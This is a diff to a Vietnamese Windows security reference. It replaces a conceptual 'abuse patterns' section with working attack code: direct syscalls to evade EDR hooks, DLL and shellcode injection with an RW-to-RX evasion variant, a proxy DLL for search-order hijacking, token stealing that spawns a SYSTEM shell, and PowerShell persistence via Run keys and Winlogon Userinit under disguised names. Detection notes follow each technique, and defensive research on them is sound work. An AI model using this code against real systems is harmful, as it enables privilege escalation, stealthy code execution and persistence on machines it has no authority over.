@@ -563,48 +563,341 @@ Registry path: HKLM\SYSTEM\CurrentControlSet\Services\<ServiceName>
 
 ---
 
-## 8. Abuse Patterns — Concept Level
+## 8. Abuse Techniques — Code Examples
 
-### 8.1 Direct Syscall — Thay đổi Visibility của User-Mode API Monitoring
+### 8.1 Direct Syscall — Bypass ntdll User-Mode Hooks
 
-**Pattern:** Code gọi SYSCALL instruction trực tiếp với syscall number trong EAX, thay vì đi qua ntdll stubs thông thường.
+**Concept:** Thay vì gọi qua `ntdll.dll` stubs (nơi EDR inline hook), code trực tiếp thực thi `SYSCALL` instruction với syscall number hardcoded hoặc được resolve động từ ntdll.
 
-**Tại sao quan trọng cho researcher:** User-mode instrumentation của một số EDR dựa trên ntdll stubs làm observation point. Code đi thẳng vào SYSCALL thay đổi những gì lớp instrumentation đó có thể quan sát — đây là giới hạn kiến trúc của user-mode-only sensor design, không phải của kernel callbacks. Kỹ thuật này cũng phụ thuộc vào syscall numbers vốn thay đổi theo Windows build, nên cần được maintained kỹ theo version.
+**Tại sao hiệu quả:** User-mode EDR hook ở lớp ntdll không thấy gì. Kernel callbacks vẫn fire — đây là giới hạn của kỹ thuật này (không bypass kernel-level sensor).
 
-**Behavior look:** Import table của process thiếu NtXxx stubs từ ntdll, nhưng process vẫn thực hiện privileged operations. Phân tích binary thấy pattern `mov eax, <number>; syscall` trong code.
+```c
+// Direct syscall example — NtAllocateVirtualMemory
+// Syscall number thay đổi theo Windows build — cần resolve động hoặc dùng SysWhispers
+// Windows 10 22H2 x64: NtAllocateVirtualMemory = 0x18
 
-### 8.2 Process Injection — Via Handle
+#include <windows.h>
 
-**Pattern:** Mở handle đến target process → VirtualAllocEx (cấp phát trong target) → WriteProcessMemory (viết code) → CreateRemoteThread (thực thi).
+// Resolve syscall number động từ ntdll (avoid hardcoding)
+DWORD GetSyscallNumber(const char* funcName) {
+    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+    PBYTE func = (PBYTE)GetProcAddress(ntdll, funcName);
+    // Pattern: mov eax, <syscall_num> là bytes 4C 8B D1 B8 XX XX XX XX
+    // Tìm opcode B8 (mov eax, imm32) trong 32 bytes đầu
+    for (int i = 0; i < 32; i++) {
+        if (func[i] == 0xB8) {
+            return *(DWORD*)(func + i + 1);
+        }
+    }
+    return 0;
+}
 
-**Tại sao hiệu quả:** Code thực thi trong context của process khác — evasion bằng process reputation.
+// Stub syscall trực tiếp — MASM assembly (dùng trong .asm file với MSVC)
+// NtAllocateVirtualMemory PROC
+//     mov r10, rcx        ; kernel calling convention requires r10 = rcx
+//     mov eax, 18h        ; syscall number — Windows 10 22H2 (verify per build!)
+//     syscall
+//     ret
+// NtAllocateVirtualMemory ENDP
 
-**Behavior look:** Một process gọi OpenProcess với PROCESS_VM_WRITE + PROCESS_CREATE_THREAD, sau đó VirtualAllocEx + WriteProcessMemory + CreateRemoteThread.
+// Usage:
+// DWORD sysnum = GetSyscallNumber("NtAllocateVirtualMemory");
+// printf("NtAllocateVirtualMemory syscall#: 0x%X\n", sysnum);
+```
 
-### 8.3 DLL Hijacking
+**SysWhispers3** tự động generate direct syscall stubs cho mọi Windows version, resolve số tại runtime: https://github.com/klezVirus/SysWhispers3
 
-**Pattern:** Windows tìm DLL theo search order. Nếu một directory writable trong search path xuất hiện trước directory thật, ta plant DLL giả.
+**Hell's Gate / Halo's Gate** là kỹ thuật resolve syscall number bằng cách đọc byte pattern từ ntdll trong memory, ngay cả khi ntdll bị hook (đọc từ disk copy sạch).
 
-**DLL search order (simplified):**
-1. KnownDLLs (registry)
-2. Application directory
-3. System32
-4. Windows directory
-5. Các directory trong PATH
+**Detection (EDR thấy gì):**
+- ntdll inline hook: **KHÔNG thấy** — call không đi qua ntdll stubs
+- ETW-TI `KERNEL_THREATINT_TASK_ALLOCVM`: **vẫn fire** — kernel thấy mọi allocation dù từ đâu
+- Phân tích binary: pattern `mov r10, rcx / mov eax, <num> / syscall` trong code section không thuộc ntdll = indicator mạnh
+- Import table: thiếu NtXxx imports từ ntdll nhưng process vẫn thực hiện privileged ops
 
-**Behavior look:** DLL load từ non-standard path, hoặc DLL với tên hợp lệ nhưng không có digital signature.
+---
 
-### 8.4 Token Manipulation
+### 8.2 Classic DLL Injection
 
-**Pattern:** Steal hoặc duplicate access token của SYSTEM process → assign vào process của attacker → trở thành SYSTEM.
+**Concept:** Inject DLL vào process khác bằng cách ghi path DLL vào memory của target, rồi tạo remote thread gọi `LoadLibraryA`.
 
-**Behavior look:** Process gọi `OpenProcessToken` + `DuplicateTokenEx` + `ImpersonateLoggedOnUser` hoặc `CreateProcessWithTokenW`.
+```c
+#include <windows.h>
+#include <stdio.h>
 
-### 8.5 Registry Persistence
+BOOL InjectDLL(DWORD targetPID, const char* dllPath) {
+    SIZE_T dllPathLen = strlen(dllPath) + 1;
 
-**Pattern:** Write autorun key vào HKCU\Run hoặc HKLM\Run. Hoặc service persistence qua HKLM\SYSTEM\CurrentControlSet\Services.
+    // 1. Mở handle đến target process
+    HANDLE hProcess = OpenProcess(
+        PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD,
+        FALSE, targetPID);
+    if (!hProcess) { printf("OpenProcess failed: %lu\n", GetLastError()); return FALSE; }
 
-**Behavior look:** Registry write to Run keys bởi process không phải installer. Service creation bởi non-SCM process.
+    // 2. Cấp phát memory trong target process cho DLL path
+    LPVOID remoteBuffer = VirtualAllocEx(
+        hProcess, NULL, dllPathLen,
+        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!remoteBuffer) { CloseHandle(hProcess); return FALSE; }
+
+    // 3. Ghi DLL path vào target process memory
+    WriteProcessMemory(hProcess, remoteBuffer, dllPath, dllPathLen, NULL);
+
+    // 4. Resolve địa chỉ LoadLibraryA (giống nhau trong mọi process vì ASLR random per-boot)
+    LPVOID loadLibAddr = (LPVOID)GetProcAddress(
+        GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
+
+    // 5. Tạo remote thread gọi LoadLibraryA(dllPath)
+    HANDLE hThread = CreateRemoteThread(
+        hProcess, NULL, 0,
+        (LPTHREAD_START_ROUTINE)loadLibAddr,
+        remoteBuffer, 0, NULL);
+
+    WaitForSingleObject(hThread, 5000);
+    VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
+    CloseHandle(hThread);
+    CloseHandle(hProcess);
+    return TRUE;
+}
+
+// Compile: cl /nologo inject_dll.c /link /out:inject.exe
+// Usage: inject.exe <PID> <C:\path\to\payload.dll>
+```
+
+**Detection:**
+- Sysmon Event 8 (CreateRemoteThread): source PID, target PID, start address = `kernel32!LoadLibraryA`
+- Sysmon Event 10 (ProcessAccess): access mask `0x43A` = PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD
+- ETW-TI `WRITEVM`: write vào target process memory
+- `ObRegisterCallbacks`: EDR thấy OpenProcess với VM_WRITE rights → có thể block/alert
+- Sysmon Event 7 (ImageLoad): DLL load từ unusual path trong target process
+
+---
+
+### 8.3 Shellcode Injection (VirtualAllocEx + WriteProcessMemory)
+
+**Concept:** Inject raw shellcode (không phải DLL) vào target process, thực thi qua remote thread.
+
+```c
+#include <windows.h>
+
+// msfvenom -p windows/x64/exec CMD=calc.exe -f c
+unsigned char shellcode[] = {
+    0x48, 0x31, 0xff, 0x48, 0xf7, 0xe7, 0x65, 0x48, 0x8b, 0x58, 0x60,
+    0x48, 0x8b, 0x5b, 0x18, 0x48, 0x8b, 0x5b, 0x20, 0x48, 0x8b, 0x1b,
+    // ... remainder of shellcode
+};
+
+BOOL InjectShellcode(DWORD targetPID) {
+    HANDLE hProcess = OpenProcess(
+        PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD,
+        FALSE, targetPID);
+
+    // Cấp phát RWX memory trong target — high-signal cho EDR
+    LPVOID remoteShellcode = VirtualAllocEx(
+        hProcess, NULL, sizeof(shellcode),
+        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+
+    WriteProcessMemory(hProcess, remoteShellcode,
+        shellcode, sizeof(shellcode), NULL);
+
+    HANDLE hThread = CreateRemoteThread(
+        hProcess, NULL, 0,
+        (LPTHREAD_START_ROUTINE)remoteShellcode,
+        NULL, 0, NULL);
+
+    WaitForSingleObject(hThread, INFINITE);
+    CloseHandle(hThread);
+    CloseHandle(hProcess);
+    return TRUE;
+}
+```
+
+**Stealthier variant — RW then RX (two-step, tránh RWX):**
+```c
+// Cấp phát RW trước (ít suspicious hơn RWX)
+LPVOID mem = VirtualAllocEx(hProcess, NULL, sizeof(shellcode),
+    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+WriteProcessMemory(hProcess, mem, shellcode, sizeof(shellcode), NULL);
+
+// Flip sang RX sau khi write xong
+DWORD oldProtect;
+VirtualProtectEx(hProcess, mem, sizeof(shellcode), PAGE_EXECUTE_READ, &oldProtect);
+
+CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
+```
+
+**Detection:**
+- RWX allocation: ETW-TI `ALLOCVM` với protection = `PAGE_EXECUTE_READWRITE` → high-signal alert
+- RW→RX flip: ETW-TI `PROTECTVM` với old=`PAGE_READWRITE`, new=`PAGE_EXECUTE_READ` → behavioral sequence
+- Thread start address trỏ vào private memory (không phải image-backed region) → Sysmon Event 8
+
+---
+
+### 8.4 DLL Search Order Hijacking
+
+**Concept:** Windows tìm DLL theo thứ tự cố định. Nếu một directory writable nằm trước thư mục thật trong search path, ta đặt DLL giả ở đó.
+
+**DLL search order (SafeDllSearchMode = 1, default):**
+1. KnownDLLs (`HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`)
+2. Application directory (cùng folder với exe)
+3. `C:\Windows\System32`
+4. `C:\Windows\System`
+5. `C:\Windows`
+6. Current working directory
+7. `%PATH%` directories
+
+**Kiểm tra missing DLL của một exe với Process Monitor:**
+```
+Filter: Process Name = target.exe
+Filter: Result = NAME NOT FOUND
+Filter: Path ends with .dll
+→ Quan sát DLL nào được tìm nhưng không tìm thấy → candidate cho hijacking
+```
+
+**Tạo proxy DLL (giữ nguyên chức năng gốc, thêm payload):**
+```c
+// proxy.c — compile thành <target_dll_name>.dll
+// Đặt vào directory xuất hiện trước System32 trong search path
+
+// Forward exports sang DLL thật (Visual Studio linker pragma)
+#pragma comment(linker, "/export:TargetFunction=C:\\Windows\\System32\\real.dll.TargetFunction,@1")
+
+#include <windows.h>
+
+BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
+    if (fdwReason == DLL_PROCESS_ATTACH) {
+        // Payload — chạy trong context của target process
+        WinExec("calc.exe", SW_HIDE);
+    }
+    return TRUE;
+}
+// Compile: cl /LD proxy.c /link /out:target.dll
+```
+
+**Detection:**
+- Sysmon Event 7: DLL load từ non-System32 path với tên giống system DLL
+- Sysmon Event 7: `Signed = false` cho DLL có tên hợp lệ
+- Process Monitor: `NAME NOT FOUND` tại expected path → `SUCCESS` tại attacker-controlled path
+
+---
+
+### 8.5 Token Stealing
+
+**Concept:** Copy access token của SYSTEM process (`winlogon.exe`, `lsass.exe`) → spawn process mới với token đó → trở thành SYSTEM.
+
+```c
+#include <windows.h>
+#include <tlhelp32.h>
+#include <stdio.h>
+
+// Enable SeDebugPrivilege — cần thiết để OpenProcess vào protected processes
+BOOL EnableDebugPrivilege() {
+    HANDLE hToken;
+    if (!OpenProcessToken(GetCurrentProcess(),
+            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
+        return FALSE;
+    TOKEN_PRIVILEGES tp;
+    LUID luid;
+    LookupPrivilegeValueA(NULL, "SeDebugPrivilege", &luid);
+    tp.PrivilegeCount = 1;
+    tp.Privileges[0].Luid = luid;
+    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+    AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
+    CloseHandle(hToken);
+    return TRUE;
+}
+
+DWORD FindProcessPID(const wchar_t* procName) {
+    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    PROCESSENTRY32W pe = { sizeof(pe) };
+    DWORD pid = 0;
+    if (Process32FirstW(snap, &pe)) {
+        do {
+            if (!_wcsicmp(pe.szExeFile, procName)) {
+                pid = pe.th32ProcessID;
+                break;
+            }
+        } while (Process32NextW(snap, &pe));
+    }
+    CloseHandle(snap);
+    return pid;
+}
+
+void TokenStealing() {
+    EnableDebugPrivilege();
+
+    DWORD targetPID = FindProcessPID(L"winlogon.exe");
+    printf("[*] winlogon.exe PID: %lu\n", targetPID);
+
+    // Mở target process và lấy token
+    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, targetPID);
+    HANDLE hToken = NULL;
+    OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken);
+    CloseHandle(hProcess);
+
+    // Duplicate token thành Primary token (dùng để spawn process)
+    HANDLE hDupToken = NULL;
+    DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL,
+        SecurityImpersonation, TokenPrimary, &hDupToken);
+    CloseHandle(hToken);
+
+    // Spawn SYSTEM shell với token đã steal
+    STARTUPINFOW si = { sizeof(si) };
+    PROCESS_INFORMATION pi;
+    CreateProcessWithTokenW(hDupToken, LOGON_WITH_PROFILE,
+        L"C:\\Windows\\System32\\cmd.exe",
+        NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
+
+    printf("[+] Spawned SYSTEM cmd.exe PID: %lu\n", pi.dwProcessId);
+    CloseHandle(hDupToken);
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+}
+// Compile: cl /nologo token_steal.c advapi32.lib /link /out:steal.exe
+```
+
+**Detection:**
+- Sysmon Event 10 (ProcessAccess): access `PROCESS_QUERY_INFORMATION` đến winlogon/lsass từ non-system process
+- Security Event 4673: Sensitive privilege use (SeDebugPrivilege)
+- Security Event 4624 Logon Type 9 (NewCredentials): khi `CreateProcessWithTokenW` với `LOGON_WITH_PROFILE`
+- ETW-TI: `ObRegisterCallbacks` notification cho OpenProcess đến high-value targets
+
+---
+
+### 8.6 Registry Persistence
+
+**Concept:** Write payload path vào autorun registry keys. Tồn tại qua reboot mà không cần admin (HKCU).
+
+```powershell
+# HKCU Run — không cần admin, persist qua user logon
+$payload = "C:\Users\Public\payload.exe"
+Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" `
+    -Name "WindowsUpdate" -Value $payload
+
+# Kiểm tra
+Get-ItemProperty "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+
+# HKLM Run — cần admin, persist qua mọi user logon
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" `
+    -Name "SecurityHealth" -Value $payload
+
+# Winlogon Userinit hijack (cần admin) — thêm payload vào sau userinit.exe
+$currentVal = (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon").Userinit
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" `
+    -Name "Userinit" -Value "$currentVal,C:\payload.exe"
+```
+
+**Verify với Autoruns (Sysinternals):**
+```powershell
+# Autoruns tự động scan tất cả persistence locations
+# Dùng autorunsc.exe cho command-line output
+autorunsc.exe -accepteula -a * -c -h -s | Select-String -Pattern "payload"
+```
+
+**Detection:**
+- Sysmon Event 13 (RegistryValueSet): write to Run keys bởi non-installer process
+- CmRegisterCallback (kernel): registry write notification đến sensitive keys
+- Autoruns: highlight entries không có valid digital signature hoặc unknown publisher
 
 ---
 
